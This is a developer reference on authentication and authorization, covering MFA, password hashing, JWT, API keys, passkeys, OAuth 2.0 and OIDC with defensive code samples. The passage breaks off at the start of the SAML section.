---
title: "Security & Auth — Complete Developer Reference"
description: "Overview of modern authentication systems"
---
> Authentication · Authorization · Tokens · Protocols · Access Control · Implementation · Security
---

## Table of Contents

1. [Overview & Core Concepts](#1-overview--core-concepts)
2. [Authentication vs Authorization](#2-authentication-vs-authorization)
3. [Authentication Factors & MFA](#3-authentication-factors--mfa)
4. [Passwords & Hashing](#4-passwords--hashing)
5. [JWT — JSON Web Tokens](#5-jwt--json-web-tokens)
6. [Bearer Tokens](#6-bearer-tokens)
7. [API Keys](#7-api-keys)
8. [Biometrics & Passkeys (FIDO2 / WebAuthn)](#8-biometrics--passkeys-fido2--webauthn)
9. [Certificates & PKI](#9-certificates--pki)
10. [OAuth 2.0](#10-oauth-20)
11. [OpenID Connect (OIDC)](#11-openid-connect-oidc)
12. [SAML 2.0 & Enterprise SSO](#12-saml-20--enterprise-sso)
13. [MFA Protocols Deep Dive](#13-mfa-protocols-deep-dive)
14. [Protocol Reference](#14-protocol-reference)
15. [RBAC & ABAC](#15-rbac--abac)
16. [Permissions & Scopes](#16-permissions--scopes)
17. [Zero Trust Architecture](#17-zero-trust-architecture)
18. [Auth in Code](#18-auth-in-code)
19. [Sessions & Cookies](#19-sessions--cookies)
20. [Token Storage](#20-token-storage)
21. [HTTP Security Headers](#21-http-security-headers)
22. [Threats & Attacks](#22-threats--attacks)
23. [Best Practices](#23-best-practices)
24. [Security Checklist](#24-security-checklist)

---

## 1. Overview & Core Concepts

Authentication and authorization are the twin pillars of application security. They are distinct but work together to protect resources.

```
User → [Credentials] → AUTHENTICATION → [Identity] → AUTHORIZATION → [Token/Policy] → ACCESS CONTROL → Resource
```

| Concept | Description |
|---|---|
| **Authentication (AuthN)** | Proves identity. "Who are you?" — login, credentials, tokens |
| **Authorization (AuthZ)** | Decides access. "What are you allowed to do?" — roles, scopes, policies |
| **Session** | Server-side state tracking an authenticated user between requests |
| **Token** | Portable credential carrying identity claims (JWT, session ID, API key) |
| **Credential** | Proof of identity: password, certificate, biometric, hardware key |
| **Principal** | The authenticated entity — a user, service, or device |
| **Identity Provider (IdP)** | A trusted system that authenticates users (Google, Okta, ADFS) |
| **Resource Server** | The API or service that protects resources and validates tokens |
| **Claim** | A statement about an entity, carried inside a token (name, role, email) |

### The Auth Pipeline

Every authenticated request passes through this sequence:

1. **Identity claim** — user presents credentials or a token
2. **Authentication** — credentials verified, identity established
3. **Token issuance** — access token + optional refresh token issued
4. **Authorization** — token's claims checked against permission policies
5. **Access decision** — allow or deny the specific operation
6. **Audit** — event logged with outcome, identity, resource, timestamp

---

## 2. Authentication vs Authorization

These two concepts are frequently confused, with serious security consequences.

### Authentication (AuthN)

- **Question:** "Who are you?"
- **Happens:** First — before any resource access
- **Proven by:** Passwords, biometrics, certificates, hardware tokens, passkeys
- **Result:** A confirmed identity (e.g. `alice@company.com`, `user_id: 123`)
- **On failure:** `401 Unauthorized`
- **Protocols:** OIDC, SAML 2.0, LDAP, WebAuthn, Kerberos

### Authorization (AuthZ)

- **Question:** "What are you allowed to do?"
- **Happens:** After authentication succeeds
- **Expressed as:** Roles, scopes, permissions, ACLs, attribute policies
- **Result:** Allow or Deny for a specific operation on a specific resource
- **On failure:** `403 Forbidden`
- **Protocols:** OAuth 2.0 (authorization framework), XACML, OPA policies

### Critical Distinction: HTTP Status Codes

```
401 Unauthorized  →  Not authenticated  (identity unknown)
403 Forbidden     →  Not authorized     (identity known, but access denied)
```

Returning `401` when you mean `403` leaks that the resource exists. Many APIs return `404` for `403` on sensitive resources to avoid enumeration.

### Common Mistake: OAuth 2.0 is NOT Authentication

OAuth 2.0 grants a third-party app access to resources — it is an **authorization** framework. Using an OAuth access token to determine *who a user is* is incorrect and can be exploited.

**OpenID Connect (OIDC)** is the correct solution — it adds an identity layer (ID token) on top of OAuth 2.0.

---

## 3. Authentication Factors & MFA

Authentication factors are categories of evidence used to prove identity.

### The Five Factor Categories

| Factor | Also Called | What It Is | Examples |
|---|---|---|---|
| **Knowledge** | Something you know | Secret information only the user knows | Password, PIN, security question, passphrase |
| **Possession** | Something you have | A physical or digital device/token | Phone (OTP), Yubikey, smart card, TOTP app |
| **Inherence** | Something you are | A biological or behavioral characteristic | Fingerprint, Face ID, iris scan, voice, typing cadence |
| **Location** | Somewhere you are | Physical or network location | IP geolocation, GPS, office network, country |
| **Time** | Something time-bound | Temporal constraints on access | Business hours only, TOTP 30-second windows |

### Multi-Factor Authentication (MFA)

MFA requires two or more factors from *different categories*. Using two passwords is not MFA — it's still just "something you know" twice.

**Strength ranking (weakest → strongest):**

| Method | Strength | Notes |
|---|---|---|
| Password only | ⚠️ Weak | Single factor; phishable; leaked in breaches |
| Password + SMS OTP | 🟡 Moderate | SIM swap vulnerability; better than nothing |
| Password + TOTP app | 🟢 Good | Standard recommendation for most apps |
| Password + hardware key (FIDO U2F) | 🔵 Strong | Phishing-resistant; physical possession required |
| Passkey (FIDO2) + biometric | 🔵 Strong | Passwordless + phishing-resistant by design |
| Hardware key + PIN + biometric (3FA) | 🟣 Very strong | High-security / enterprise environments |

### How TOTP Works (RFC 6238)

```
Shared Secret (Base32)
        +
Current Unix Timestamp ÷ 30   (30-second window)
        ↓
   HMAC-SHA1(secret, time_counter)
        ↓
   Truncate to 6 digits
        ↓
   "482 917"  ← valid for ~30 seconds
```

Both the authenticator app and the server perform the same calculation independently. They match → authentication succeeds. No code is ever transmitted over the network during login — only the result.

**Clock skew tolerance:** Servers typically accept codes from the current window ±1 (i.e. the last 30 seconds and the next 30 seconds) to handle slight clock drift.

### Common MFA Combinations

```
Consumer 2FA (recommended):    Password + TOTP app
Consumer 2FA (weak):           Password + SMS OTP  ← SIM swap risk
Enterprise 3FA:                Password + Yubikey + Face ID
Passwordless (best):           Passkey + biometric unlock
High-security:                 Certificate + hardware token + PIN
```

---

## 4. Passwords & Hashing

Passwords must be stored as one-way hashes — never in plaintext, never with reversible encryption.

### Why You Can't Use General-Purpose Hash Functions

MD5, SHA-1, SHA-256, and SHA-512 are designed to be **fast**. A modern GPU can compute billions of SHA-256 hashes per second, making brute-force and rainbow table attacks trivial. Password hashing algorithms are intentionally slow and memory-hard.

### Password Hashing Algorithms

| Algorithm | Use? | Key Properties |
|---|---|---|
| `MD5` | ❌ Never | Broken, no salt, catastrophically fast |
| `SHA-1 / SHA-256` | ❌ Never for passwords | Too fast; use only for data integrity |
| `bcrypt` | ✅ Good | Built-in salt; tunable cost factor; 72-char limit |
| `scrypt` | ✅ Good | Memory-hard; resists GPU/ASIC attacks |
| `Argon2id` | ✅ Best | PHC winner; memory + CPU hard; OWASP recommended |
| `PBKDF2` | ⚠️ Acceptable | FIPS-compliant; weaker than Argon2 against GPU attacks |

**OWASP recommendations (2024):**
- **Argon2id:** m=64MB, t=3 iterations, p=4 parallelism
- **bcrypt:** cost factor ≥ 12 (aim for ~250ms hashing time)
- **PBKDF2-HMAC-SHA512:** ≥ 600,000 iterations

### Password Hashing in Code

**Node.js — bcrypt:**
```javascript
const bcrypt = require('bcrypt');

// Hash a password (saltRounds = cost factor)
const saltRounds = 12; // ~250ms on modern hardware
const hash = await bcrypt.hash(plainPassword, saltRounds);
// Returns: "$2b$12$KIXQlm..." (60-char string, includes salt)

// Verify during login — constant-time comparison built in
const match = await bcrypt.compare(plainPassword, storedHash);
if (match) { /* authenticated */ }
```

**Python — Argon2:**
```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3,      # iterations
    memory_cost=65536, # 64MB
    parallelism=4
)

# Hash
hash = ph.hash(password)  # "$argon2id$v=19$m=65536,t=3,p=4$..."

# Verify
try:
    ph.verify(hash, password)
    # Re-hash if parameters have been updated
    if ph.check_needs_rehash(hash):
        hash = ph.hash(password)
except VerifyMismatchError:
    pass  # Wrong password
```

**Go — bcrypt:**
```go
import "golang.org/x/crypto/bcrypt"

// Hash
hash, err := bcrypt.GenerateFromPassword([]byte(password), 12)

// Verify
err = bcrypt.CompareHashAndPassword(hash, []byte(password))
if err == nil { /* authenticated */ }
```

### Password Policy Best Practices

- **Minimum length:** 12+ characters (NIST recommends 8 minimum, but 12+ is better)
- **Maximum length:** 64–72 characters (bcrypt truncates at 72 bytes)
- **Complexity:** Avoid complex rules (uppercase + number + symbol) — they hurt usability more than security
- **Block common passwords:** Check against lists like HaveIBeenPwned (top 1M breached passwords)
- **Block contextual passwords:** App name, username, company name in password
- **No periodic forced rotation:** NIST SP 800-63B no longer recommends forced rotation — it leads to weak incremental changes
- **Do force rotation:** On suspected breach, or when user requests it

### Salting

A salt is a random value added to the password before hashing. It ensures two users with the same password have different hashes, and prevents precomputed rainbow table attacks.

```
hash("password123")          → always "abc123..." (attackable)
hash("password123" + salt)   → unique per user    (safe)
```

bcrypt, Argon2, and scrypt all handle salting automatically and include the salt in the output string.

---

## 5. JWT — JSON Web Tokens

JWTs are compact, URL-safe tokens that carry **claims** (statements about an entity). They are self-contained: the server can verify them without a database lookup by checking the cryptographic signature.

### JWT Structure

A JWT has three base64url-encoded parts separated by dots:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9          ← Header
.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJhZG1pbiJ9 ← Payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
```

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-id-2024"
}
```

**Payload:**
```json
{
  "sub": "user_123",
  "name": "Alice",
  "email": "alice@company.com",
  "role": "admin",
  "iat": 1700000000,
  "exp": 1700003600,
  "iss": "https://auth.myapp.com",
  "aud": "myapi.com"
}
```

**Signature:**
```
RSASHA256(
  base64url(header) + "." + base64url(payload),
  privateKey
)
```

### ⚠️ JWT is NOT Encrypted by Default

The payload is only **base64-encoded** — not encrypted. It is fully readable by anyone who has the token. Never put sensitive data (passwords, PII, secrets, SSNs) in JWT claims unless you use **JWE (JSON Web Encryption)**.

### Standard Claims (RFC 7519)

| Claim | Full Name | Description |
|---|---|---|
| `iss` | Issuer | Who created the token (URL of auth server). Always validate. |
| `sub` | Subject | Who the token is about (user ID). Your primary user identifier. |
| `aud` | Audience | Who the token is intended for. **Always validate this.** |
| `exp` | Expiration | Unix timestamp after which token is invalid. **Always set.** |
| `iat` | Issued At | When the token was created. |
| `nbf` | Not Before | Token invalid before this timestamp. |
| `jti` | JWT ID | Unique identifier. Use to prevent replay attacks. |

### Signing Algorithms

| Algorithm | Type | Key | Use Case | Recommendation |
|---|---|---|---|---|
| `HS256` | HMAC-SHA256 | Symmetric (shared secret) | Single-service, same app signs + verifies | ⚠️ Caution — shared secret must be protected |
| `RS256` | RSA-SHA256 | Asymmetric (key pair) | Auth server signs, APIs verify with public key | ✅ Good — standard for distributed systems |
| `ES256` | ECDSA-SHA256 | Asymmetric (key pair) | Smaller keys/signatures, mobile-friendly | ✅ Best — smaller and faster than RSA |
| `none` | No signature | None | Never | ❌ Critical vulnerability — never accept |

**Use RS256 or ES256 for any system with multiple services.** The auth server keeps the private key; all APIs only need the public key (which can be distributed freely via JWKS endpoint).

### JWT Validation — Complete Checklist

When verifying a JWT, you must check **all** of the following:

1. ✅ Signature is valid (using the correct key)
2. ✅ `alg` header matches your explicit allowlist (never trust the token's own `alg`)
3. ✅ `exp` — token has not expired
4. ✅ `iss` — issuer matches expected auth server URL
5. ✅ `aud` — audience includes your service's identifier
6. ✅ `nbf` — current time is after "not before" (if present)
7. ✅ Token structure is valid (3 parts, valid base64url)

### JWT Code Examples

**Node.js — Issue and verify:**
```javascript
const jwt = require('jsonwebtoken');

// Issue a token (auth server)
const token = jwt.sign(
  {
    sub: 'user_123',
    email: 'alice@company.com',
    role: 'admin',
  },
  privateKey,  // RS256 private key
  {
    algorithm: 'RS256',
    expiresIn: '15m',
    audience: 'myapi.com',
    issuer: 'https://auth.myapp.com',
  }
);

// Verify a token (API server)
try {
  const payload = jwt.verify(token, publicKey, {
    algorithms: ['RS256'],  // ← ALWAYS explicit — prevents "alg:none" attack
    audience: 'myapi.com',
    issuer: 'https://auth.myapp.com',
  });
  // payload.sub, payload.role are now trusted
} catch (err) {
  // TokenExpiredError, JsonWebTokenError, NotBeforeError
  res.status(401).json({ error: 'Invalid token' });
}
```

**Python — with python-jose:**
```python
from jose import jwt, JWTError

# Issue
token = jwt.encode(
    {"sub": "user_123", "role": "admin", "exp": datetime.utcnow() + timedelta(minutes=15)},
    private_key,
    algorithm="RS256"
)

# Verify
try:
    payload = jwt.decode(
        token,
        public_key,
        algorithms=["RS256"],
        audience="myapi.com",
        issuer="https://auth.myapp.com"
    )
except JWTError:
    raise HTTPException(status_code=401, detail="Invalid token")
```

### JWKS — JSON Web Key Sets

In distributed systems, the auth server exposes a public JWKS endpoint. APIs fetch the public keys from it automatically, enabling seamless key rotation:

```
GET https://auth.myapp.com/.well-known/jwks.json

{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "key-id-2024",
      "n": "sD9...",
      "e": "AQAB"
    }
  ]
}
```

The `kid` (key ID) in the JWT header tells the verifier which key to use. This enables zero-downtime key rotation.

---

## 6. Bearer Tokens

Bearer tokens implement the principle: "whoever bears (holds) this token gets access." They are the dominant API authentication mechanism, defined in RFC 6750.

### How Bearer Auth Works

```
Client → POST /auth/login → Auth Server
                         ← { access_token, refresh_token, expires_in }

Client → GET /api/users (Authorization: Bearer <token>) → Resource API
                                                        ← 200 { data }
                                                        ← 401 { expired }
```

### Request Format

```http
GET /api/users/me HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
```

**Rules:**
- Always use the `Authorization` header — never query parameters (they appear in server logs)
- Always use HTTPS — bearer tokens in plain HTTP are trivially intercepted
- The scheme `Bearer` is case-insensitive but `Bearer` is conventional

### Bearer Token in Code

**JavaScript / fetch:**
```javascript
const response = await fetch('https://api.example.com/users/me', {
  headers: {
    'Authorization': `Bearer ${accessToken}`,
    'Content-Type': 'application/json',
  },
});

if (response.status === 401) {
  // Token expired — try refreshing
  const newToken = await refreshAccessToken();
  // Retry request with new token
}

if (response.status === 403) {
  // Authenticated but not authorized for this resource
}
```

**Python — requests:**
```python
import requests

response = requests.get(
    'https://api.example.com/users/me',
    headers={'Authorization': f'Bearer {access_token}'}
)
```

**cURL:**
```bash
curl -H "Authorization: Bearer $ACCESS_TOKEN" \
     https://api.example.com/users/me
```

### Access Token vs Refresh Token

| Property | Access Token | Refresh Token |
|---|---|---|
| **Lifetime** | Short: 5–60 minutes | Long: hours to months |
| **Purpose** | Authorizes API calls (sent every request) | Gets new access tokens without re-login |
| **Sent to** | Resource servers (APIs) | Auth server only |
| **Storage** | Memory (JS) or secure storage | HttpOnly cookie or secure encrypted storage |
| **Format** | Usually JWT (self-contained) | Usually opaque (random string + DB lookup) |
| **On compromise** | Expires soon | Must revoke immediately |
| **Rotation** | Issued fresh by refresh flow | Rotate on every use (refresh token rotation) |

### Refresh Token Flow

```javascript
async function callApiWithRefresh(url) {
  let response = await fetch(url, {
    headers: { Authorization: `Bearer ${getAccessToken()}` }
  });

  if (response.status === 401) {
    // Try to get a new access token using the refresh token
    const refreshed = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include', // sends HttpOnly refresh token cookie
    });

    if (!refreshed.ok) {
      // Refresh token expired/revoked — user must log in again
      redirectToLogin();
      return;
    }

    const { access_token } = await refreshed.json();
    setAccessToken(access_token);

    // Retry original request
    response = await fetch(url, {
      headers: { Authorization: `Bearer ${access_token}` }
    });
  }

  return response;
}
```

---

## 7. API Keys

API keys are long-lived static credentials used primarily for machine-to-machine (M2M) authentication. They identify and authenticate a client application.

### Key Anatomy

Good API keys have a recognizable structure:

```
sk_live_4xK9mN2pQ7rT1vW8yA3bC6eFjH5dL0nP
│  │      └─ 32+ bytes of cryptographic randomness
│  └─ environment: live / test
└─ service prefix
```

Examples: Stripe uses `sk_live_`, GitHub uses `ghp_`, AWS uses `AKIA` prefix.

### Sending API Keys

```http
# Header-based (preferred)
Authorization: Api-Key sk_live_4xK9mN2pQ7rT1vW8yA3bC6eF
X-API-Key: sk_live_4xK9mN2pQ7rT1vW8yA3bC6eF

# Basic auth (also acceptable)
Authorization: Basic base64(api_key:)

# Query parameter (avoid — leaks in logs, browser history)
GET /endpoint?api_key=sk_live_4xK9mN2pQ7...  ← BAD
```

### Generating and Storing API Keys

```javascript
const { randomBytes } = require('crypto');

// Generate — 32 bytes = 43 base64url characters
function generateApiKey(prefix = 'sk_live') {
  const secret = randomBytes(32).toString('base64url');
  return `${prefix}_${secret}`;
}

// Store HASHED in DB — SHA-256 is fine for API keys (not passwords)
// You can use SHA-256 here because keys are long random strings,
// not user-chosen passwords that need slow hashing
function hashApiKey(key) {
  return require('crypto').createHash('sha256').update(key).digest('hex');
}

// On key creation:
const rawKey = generateApiKey();
const keyHash = hashApiKey(rawKey);
const keyPrefix = rawKey.slice(0, 12); // "sk_live_4xK9" — for display

await db.apiKeys.insert({
  hash: keyHash,
  prefix: keyPrefix,   // show user for identification
  userId: user.id,
  scopes: ['read:reports'],
  createdAt: new Date(),
});

// IMPORTANT: Return rawKey to user exactly ONCE — never store it
return { key: rawKey, prefix: keyPrefix };

// On incoming request:
const incomingKey = req.headers['x-api-key'];
const hash = hashApiKey(incomingKey);
const keyRecord = await db.apiKeys.findOne({ hash });
if (!keyRecord) throw new UnauthorizedError();
```

### API Key Best Practices

- **Show once:** Display the full key only at creation time — never again
- **Store hash:** Store SHA-256 hash in DB; keep a human-readable prefix for identification
- **Prefix by environment:** `sk_live_` vs `sk_test_` prevents accidental cross-env use
- **Scopes:** Keys should have limited scopes, not blanket admin access
- **Rotation:** Support key rotation; allow multiple active keys during rotation windows
- **Expiry:** Optionally support key expiration dates
- **Per-key audit logs:** Log every API call attributed to each key
- **Revocation:** Revoke immediately on suspected compromise

---

## 8. Biometrics & Passkeys (FIDO2 / WebAuthn)

### Biometric Authentication

Biometrics verify identity using biological characteristics. Unlike passwords, they cannot be forgotten — but they also cannot be changed if compromised.

| Type | Technology | Strength | Use Case |
|---|---|---|---|
| Fingerprint | Capacitive/optical sensor | High | Mobile unlock, Touch ID |
| Face recognition | 3D structured light / IR | High | Face ID, Windows Hello |
| Iris scan | Near-infrared camera | Very high | High-security access control |
| Voice print | Neural audio matching | Medium | Phone banking, smart speakers |
| Behavioral | Typing cadence, mouse patterns | Low-medium | Continuous authentication |

**Critical:** Biometrics are used locally to unlock a key — the biometric data itself is never sent over the network. On a phone, Face ID unlocks a private key stored in the secure enclave; the server only sees a cryptographic signature.

### Passkeys (FIDO2 / WebAuthn)

Passkeys are the modern replacement for passwords. They use public-key cryptography and are phishing-resistant by design.

**Key properties:**
- **Passwordless** — no password to steal, forget, or reuse
- **Phishing-resistant** — keys are bound to the exact origin (domain); a fake site gets nothing
- **Biometric-backed** — device PIN or biometric unlocks the private key
- **Synced across devices** — via iCloud Keychain, Google Password Manager, or hardware key

### WebAuthn Registration Flow

```
1. App → Server:  "Start registration for user alice"
2. Server → App:  challenge (random nonce), relying party ID (your domain)
3. App → Device:  Request credential creation
4. Device:        Biometric/PIN check → generates public/private key pair
5. Device → App:  publicKey + attestation (signed by device)
6. App → Server:  publicKey + attestation
7. Server:        Verify attestation → store publicKey for user
```

### WebAuthn Authentication Flow

```
1. App → Server:  "Start authentication for alice"
2. Server → App:  challenge (random nonce) + allowedCredentials
3. App → Device:  Request assertion
4. Device:        Biometric/PIN unlocks private key → signs challenge
5. Device → App:  assertion (signature + authenticatorData)
6. App → Server:  assertion
7. Server:        Verify signature with stored publicKey → authenticated ✓
```

### Why Passkeys Are Phishing-Resistant

```
Attacker sets up:  https://g00gle.com  (fake Google)
User visits:       https://g00gle.com
Browser checks:   "Do I have a passkey for g00gle.com?"  → NO
Browser refuses:  Will not use the google.com passkey on a different origin

Even if the user is fooled, the browser is not.
```

### WebAuthn Code (Server-side, Node.js)

```javascript
const { generateRegistrationOptions, verifyRegistrationResponse } = require('@simplewebauthn/server');

// Generate registration challenge
const options = await generateRegistrationOptions({
  rpName: 'My App',
  rpID: 'myapp.com',
  userID: user.id,
  userName: user.email,
  attestationType: 'none',
  authenticatorSelection: {
    residentKey: 'preferred',
    userVerification: 'preferred',
  },
});

// Verify registration response
const verification = await verifyRegistrationResponse({
  response: req.body,
  expectedChallenge: savedChallenge,
  expectedOrigin: 'https://myapp.com',
  expectedRPID: 'myapp.com',
});

if (verification.verified) {
  // Store verification.registrationInfo.credentialPublicKey
}
```

---

## 9. Certificates & PKI

### Public Key Infrastructure (PKI)

PKI is a framework of hardware, software, policies, and standards for managing digital certificates and public-key encryption.

**Key components:**

| Component | Role |
|---|---|
| **Certificate Authority (CA)** | Issues and signs certificates. Root CAs are pre-trusted in browsers/OS. |
| **X.509 Certificate** | A document binding a public key to an identity, signed by a CA |
| **Private Key** | Secret key used to sign or decrypt. Never leaves the owner. |
| **Public Key** | Freely shareable key used to verify signatures or encrypt |
| **Certificate Chain** | Root CA → Intermediate CA → End-entity cert. Browsers verify the chain. |
| **CRL / OCSP** | Certificate revocation mechanisms |

### X.509 Certificate Contents

```
Version: 3
Serial Number: 4A:BC:DE:...
Signature Algorithm: SHA256withRSA
Issuer: CN=Let's Encrypt R3, O=Let's Encrypt, C=US
Validity:
  Not Before: 2024-01-01
  Not After:  2024-04-01
Subject: CN=myapp.com
Subject Public Key Info:
  Algorithm: RSA
  Public Key: (2048 bits)
Extensions:
  Subject Alternative Names: DNS:myapp.com, DNS:www.myapp.com
  Key Usage: Digital Signature, Key Encipherment
  Extended Key Usage: TLS Web Server Authentication
```

### mTLS — Mutual TLS

Standard TLS: only the server presents a certificate. Mutual TLS (mTLS): **both** client and server present certificates and verify each other.

```
Standard TLS:
  Client → Server cert → Client verifies server identity → Encrypted channel

Mutual TLS:
  Client → Server cert → Client verifies server ✓
  Server → Client cert → Server verifies client ✓
  Both verified → Encrypted channel
```

**Use cases for mTLS:**
- Zero-trust service meshes (Istio, Linkerd, Consul Connect)
- B2B API integrations (banking, healthcare)
- Internal microservice authentication
- IoT device authentication

### SSH Key Authentication

```bash
# Generate an Ed25519 key pair (preferred over RSA for new keys)
ssh-keygen -t ed25519 -C "alice@company.com"

# Public key (~/.ssh/id_ed25519.pub) — add to server's authorized_keys
# Private key (~/.ssh/id_ed25519) — never share; protect with passphrase

# Connect
ssh -i ~/.ssh/id_ed25519 user@server.com
```

---

## 10. OAuth 2.0

OAuth 2.0 (RFC 6749) is a **delegated authorization** framework. It lets a user grant a third-party app limited access to their resources without sharing their password.

### Core Roles

| Role | Description | Example |
|---|---|---|
| **Resource Owner** | The user who owns the data | Alice |
| **Client** | The app requesting access | A todo app wanting to access Alice's calendar |
| **Authorization Server** | Issues tokens after consent | Google's auth server |
| **Resource Server** | Hosts the protected resources | Google Calendar API |

### The Four Grant Types

#### 1. Authorization Code + PKCE (recommended for user-facing apps)

The most secure flow. Used for web apps, SPAs, and mobile apps. PKCE (Proof Key for Code Exchange) prevents authorization code interception attacks.

```
Flow:
1. App generates: code_verifier (random), code_challenge = SHA256(code_verifier)
2. App → Auth Server: GET /authorize?response_type=code
                      &client_id=...
                      &redirect_uri=https://app.com/callback
                      &scope=openid+email+read:calendar
                      &state=random_csrf_token
                      &code_challenge=BASE64URL(SHA256(verifier))
                      &code_challenge_method=S256

3. User logs in and consents at auth server
4. Auth Server → App: redirect to https://app.com/callback?code=AUTH_CODE&state=...

5. App verifies state matches → CSRF protection
6. App backend → Auth Server: POST /token
   Body: grant_type=authorization_code
         &code=AUTH_CODE
         &redirect_uri=https://app.com/callback
         &client_id=...
         &client_secret=...  (if confidential client)
         &code_verifier=...  (PKCE)

7. Auth Server → App: {
     "access_token": "eyJ...",
     "refresh_token": "rt_...",
     "id_token": "eyJ...",
     "expires_in": 3600,
     "token_type": "Bearer"
   }

8. App → Resource API: GET /calendar/events
   Authorization: Bearer eyJ...
```

#### 2. Client Credentials (M2M)

Used when no user is involved — a service authenticating as itself.

```javascript
// Node.js: get an access token using client credentials
const params = new URLSearchParams({
  grant_type: 'client_credentials',
  client_id: process.env.CLIENT_ID,
  client_secret: process.env.CLIENT_SECRET,
  scope: 'read:reports write:reports',
});

const res = await fetch('https://auth.example.com/oauth/token', {
  method: 'POST',
  body: params,
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
});

const { access_token, expires_in } = await res.json();

// Cache the token and reuse until expires_in seconds
// Refresh proactively (60 seconds before expiry)
```

#### 3. Device Code (Input-Constrained Devices)

For CLIs, TVs, and devices without a browser.

```
1. App → Auth Server: POST /device_authorization
   Body: client_id=... &scope=...
   ← { device_code, user_code: "WXYZ-1234", verification_uri: "example.com/activate", expires_in: 300 }

2. App displays: "Go to example.com/activate and enter WXYZ-1234"

3. App polls: POST /token
   Body: grant_type=urn:ietf:params:oauth:grant-type:device_code &device_code=...
   ← 400 authorization_pending  (user hasn't approved yet)
   ← 400 slow_down              (poll less frequently)
   ← 200 { access_token }       (user approved)
```

#### 4. Implicit (Deprecated)

**Do not use.** Access tokens were returned directly in the redirect URL fragment — leakable via Referer headers, browser history, and server logs. Replaced by Authorization Code + PKCE.

### OAuth Scopes

Scopes define the specific permissions an access token grants. Always request the minimum scope needed.

```
openid          → Required for OIDC (identity)
profile         → User's name, picture, website
email           → User's email address
read:users      → Read user records
write:users     → Create/update user records
delete:users    → Delete user records
admin:all       → Full admin access (high-privilege — use carefully)
```

**Scope design principles:**
- Use `resource:action` format for clarity
- Separate read and write scopes
- Never design a single all-access scope
- Scopes appear on the user consent screen — make them human-readable

### Token Endpoint Response

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "rt_5FKyU8mP3qN7vW2xA1bC",
  "scope": "openid email read:calendar",
  "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

---

## 11. OpenID Connect (OIDC)

OpenID Connect 1.0 (OIDC) is an identity layer on top of OAuth 2.0. It adds:
- The **ID token** — a signed JWT proving who the user is
- The `/userinfo` endpoint for fetching user profile data
- Standard user claims (`sub`, `email`, `name`, `picture`)
- A discovery document at `/.well-known/openid-configuration`

### OIDC vs OAuth 2.0

```
OAuth 2.0:  "Here is an access token that lets you access my calendar"
OIDC:       "Here is an ID token proving that alice@google.com just logged in"
            + "Here is an access token to call the userinfo endpoint"
```

### ID Token Claims

| Claim | Description | Notes |
|---|---|---|
| `sub` | Stable unique user identifier at this IdP | **Use this as your primary user key**, not email |
| `iss` | Issuer URL | Must match your IdP's URL |
| `aud` | Audience | Must match your client_id |
| `exp` | Expiration | Validate this |
| `iat` | Issued at | When the token was created |
| `email` | User's email | Only if `email` scope requested |
| `email_verified` | Whether IdP verified the email | Don't trust unverified emails for auth |
| `name` | Display name | Only if `profile` scope requested |
| `picture` | Profile picture URL | Only if `profile` scope requested |
| `nonce` | Replay-attack prevention | Your app sends; IdP reflects back. Verify it matches. |

### Discovery Document

OIDC providers publish a discovery document at:
```
GET https://accounts.google.com/.well-known/openid-configuration
```

This document contains all the endpoints, supported algorithms, and JWKS URI your app needs:
```json
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "userinfo_endpoint": "https://openidconnect.googleapis.com/v1/userinfo",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  "scopes_supported": ["openid", "email", "profile"],
  "id_token_signing_alg_values_supported": ["RS256"]
}
```

### OIDC Code (Node.js with openid-client)

```javascript
const { Issuer, generators } = require('openid-client');

// Auto-discover OIDC configuration
const issuer = await Issuer.discover('https://accounts.google.com');
const client = new issuer.Client({
  client_id: process.env.GOOGLE_CLIENT_ID,
  client_secret: process.env.GOOGLE_CLIENT_SECRET,
  redirect_uris: ['https://myapp.com/auth/callback'],
  response_types: ['code'],
});

// Start auth flow
const nonce = generators.nonce();
const state = generators.state();
const url = client.authorizationUrl({
  scope: 'openid email profile',
  nonce,
  state,
});

// Handle callback
const params = client.callbackParams(req);
const tokenSet = await client.callback(
  'https://myapp.com/auth/callback',
  params,
  { nonce, state }
);

const claims = tokenSet.claims();
// claims.sub — stable user ID
// claims.email — alice@gmail.com
// claims.name — Alice Smith
```

---

## 12. SAML 2.0 & Enterprise SSO

SAML (Security Assertion Markup Language) 2.0 is an XML-based federation protocol dominant in enterprise environments. It enables Single Sign-On (SSO) across organizational boundaries.

### Key Concepts

| Term | Meaning |
|---|---|
| **Service Provider (SP)** | The application user wants to access (your app) |
| **Identity Provider (IdP)** | The organization's auth system (Okta, ADFS, Ping) |
| **Assertion** | An XML document signed by the IdP, containing user attributes |
| **NameID** | The user identifier in the assertion (email, employee ID, etc.) |
| **ACS URL** | Assertion Consumer Service URL — where IdP posts the assertion to SP |
| **Entity ID** | Unique identifier for SP or IdP in the federation |
| **Metadata** | XML document describing an SP or IdP (endpoints, certificates, entity ID) |

### SP-Initiated SSO Flow

```
1. User → SP: GET /dashboard (unauthenticated)
2. SP:        Builds SAMLRequest (base64-encoded XML) + RelayState
3. SP → User: 302 redirect to IdP/sso?SAMLRequest=...&RelayState=...
4. User → IdP: GET /sso?SAMLRequest=...
5. IdP → User: Login page (if not already authenticated via SSO cookie)
6. User:       Enters credentials, MFA, etc.
7. IdP → User: Auto-submitting HTML form POST to SP's ACS URL
8. User's browser → SP ACS: POST SAMLResponse=<base64 signed XML>
9. SP:        Validates XML signature with IdP's public cert
              Extracts NameID + attributes
              Creates session
10. SP → User: 302 redirect to original resource
```

### SAML Assertion (simplified)

```xml
